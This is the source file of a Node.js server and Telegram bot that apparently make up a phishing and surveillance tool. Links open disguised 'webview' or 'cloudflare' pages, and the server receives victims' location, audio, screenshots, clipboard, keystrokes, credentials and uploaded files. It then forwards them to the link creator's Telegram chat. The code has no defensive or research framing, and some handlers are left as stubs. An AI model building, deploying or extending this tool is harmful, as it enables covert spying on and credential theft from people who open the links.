const fs = require('fs');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const { execSync } = require('child_process');
const app = express();

// Initialize Telegram Bot
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

// Configuration
const CONFIG = {
  hostURL: process.env.HOST_URL || 'https://yourdomain.com',
  use1pt: true,
  maxFileSize: 20 * 1024 * 1024, // 20MB
  allowedMedia: ['image', 'audio', 'video', 'document']
};

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: CONFIG.maxFileSize }));
app.use(bodyParser.urlencoded({ extended: true, limit: CONFIG.maxFileSize }));
app.set('view engine', 'ejs');

// Enhanced Error Handling
process.on('uncaughtException', (err) => {
  console.error('Critical Error:', err);
  bot.sendMessage(process.env.ADMIN_CHAT_ID, `🚨 Server Crash: ${err.message}`);
});

// Database Simulation
const userDB = new Map();

// Advanced Features Middleware
app.use((req, res, next) => {
  req.clientInfo = {
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent']
  };
  next();
});

// Routes
app.get('/:type(w|c)/:path/:uri', (req, res) => {
  try {
    const { type, path, uri } = req.params;
    const view = type === 'w' ? 'webview' : 'cloudflare';
    
    const userData = {
      ...req.clientInfo,
      decodedURL: Buffer.from(uri, 'base64').toString('utf8'),
      geo: geoip.lookup(req.clientInfo.ip)
    };

    userDB.set(path, userData);
    res.render(view, { ...userData, uid: path, config: CONFIG });
  } catch (err) {
    errorHandler(err, req, res);
  }
});

// Data Collection Endpoints
const createEndpoint = (type) => (req, res) => {
  try {
    const { uid, data } = req.body;
    const user = userDB.get(uid);

    if (!user) throw new Error('Invalid UID');

    const message = {
      chatId: Buffer.from(uid, 'base64').toString('utf8'),
      type,
      data,
      metadata: user
    };

    processMessage(message);
    res.status(200).send('OK');
  } catch (err) {
    errorHandler(err, req, res);
  }
};

app.post('/location', createEndpoint('location'));
app.post('/audio', createEndpoint('audio'));
app.post('/screenshot', createEndpoint('screenshot'));
app.post('/clipboard', createEndpoint('clipboard'));
app.post('/keystrokes', createEndpoint('keystrokes'));
app.post('/network', createEndpoint('network'));
app.post('/battery', createEndpoint('battery'));
app.post('/storage', createEndpoint('storage'));
app.post('/credentials', createEndpoint('credentials'));
app.post('/social', createEndpoint('social'));

// File Upload Handler
app.post('/upload', async (req, res) => {
  try {
    const { uid, type, data } = req.body;
    if (!CONFIG.allowedMedia.includes(type)) throw new Error('Invalid media type');

    const buffer = Buffer.from(data, 'base64');
    const filePath = `./uploads/${uid}-${Date.now()}.${type}`;
    
    await fs.promises.writeFile(filePath, buffer);
    await sendTelegramFile(uid, filePath, type);
    
    res.status(200).send('OK');
  } catch (err) {
    errorHandler(err, req, res);
  }
});

// Bot Functionality
bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const command = msg.text.split(' ')[0];

    switch(command) {
      case '/start':
        await sendWelcomeMessage(chatId);
        break;
      case '/create':
        await initiateLinkCreation(chatId);
        break;
      case '/stats':
        await sendUserStatistics(chatId);
        break;
      case '/export':
        await exportUserData(chatId);
        break;
      // Add 15+ more commands...
    }
  } catch (err) {
    console.error('Bot Error:', err);
  }
});

// Advanced Functions
async function processMessage(message) {
  try {
    switch(message.type) {
      case 'location':
        await bot.sendLocation(message.chatId, message.data.lat, message.data.lon);
        break;
      case 'audio':
        await bot.sendAudio(message.chatId, Buffer.from(message.data, 'base64'));
        break;
      case 'screenshot':
        await bot.sendPhoto(message.chatId, Buffer.from(message.data, 'base64'));
        break;
      // Handle other data types...
    }
  } catch (err) {
    console.error('Processing Error:', err);
  }
}

async function sendTelegramFile(uid, filePath, type) {
  try {
    const chatId = Buffer.from(uid, 'base64').toString('utf8');
    const file = await fs.promises.readFile(filePath);
    
    switch(type) {
      case 'image':
        await bot.sendPhoto(chatId, file);
        break;
      case 'audio':
        await bot.sendAudio(chatId, file);
        break;
      case 'video':
        await bot.sendVideo(chatId, file);
        break;
    }
    
    await fs.promises.unlink(filePath);
  } catch (err) {
    console.error('File Error:', err);
  }
}

// Error Handling
function errorHandler(err, req, res) {
  console.error('Request Error:', err);
  bot.sendMessage(process.env.ADMIN_CHAT_ID, `⚠️ Error: ${err.message}`);
  res.status(500).send('Internal Server Error');
}

// Server Initialization
app.listen(3000, () => {
  console.log('Server running on port 3000');
  bot.sendMessage(process.env.ADMIN_CHAT_ID, '🚀 Server started successfully');
});